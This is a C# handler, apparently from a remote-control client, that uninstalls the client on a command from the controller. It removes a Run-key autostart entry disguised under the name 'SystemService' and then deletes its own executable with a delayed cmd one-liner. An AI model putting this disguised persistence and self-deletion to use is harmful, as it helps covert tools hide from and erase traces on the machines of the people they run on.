using System;
using System.IO;
using Microsoft.Win32;
using RemoteControl.Protocals;
using RemoteControl.Protocals.Request;

namespace RemoteControl.Client.Handlers
{
    class RequestUninstallHandler : AbstractRequestHandler
    {
        public override void Handle(SocketSession session, ePacketType reqType, object reqObj)
        {
            RunTaskThread(() =>
            {
                try
                {
                    // 清理注册表启动项
                    using (RegistryKey key = Registry.CurrentUser.OpenSubKey(
                        @"Software\Microsoft\Windows\CurrentVersion\Run", true))
                    {
                        if (key != null)
                        {
                            key.DeleteValue("SystemService", false);
                        }
                    }

                    // 删除自身（通过cmd延迟删除）
                    string exePath = System.Reflection.Assembly.GetEntryAssembly().Location;
                    string cmd = "/c ping 127.0.0.1 -n 3 > nul & del \"" + exePath + "\"";
                    System.Diagnostics.Process.Start("cmd.exe", cmd);

                    // 退出进程
                    Environment.Exit(0);
                }
                catch (Exception ex)
                {
                    DoOutput("卸载失败: " + ex.Message);
                }
            });
        }
    }
}
